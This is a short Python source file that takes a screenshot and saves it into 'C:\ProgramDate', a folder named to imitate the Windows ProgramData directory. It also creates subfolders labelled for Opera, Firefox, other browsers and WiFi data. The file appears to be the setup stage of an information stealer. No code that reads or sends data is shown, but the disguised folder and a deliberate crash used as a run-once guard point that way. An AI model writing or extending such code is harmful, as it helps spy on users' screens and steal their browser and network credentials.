import os
from PIL import ImageGrab


def screenshot():
    try:
        screen = ImageGrab.grab()
        screen.save(r'C:\ProgramDate\screenshot.jpg')
    except Exception as e:
        print(e)


def make_folders():
    if os.path.exists(r'C:\ProgramDate'):
        print(0 / 0)
    else:
        os.makedirs(r'C:\ProgramDate\Opera')
        os.makedirs(r'C:\ProgramDate\Firefox')
        os.makedirs(r'C:\ProgramDate\OtherBrowsers')
        os.makedirs(r'C:\ProgramDate\WifiData')
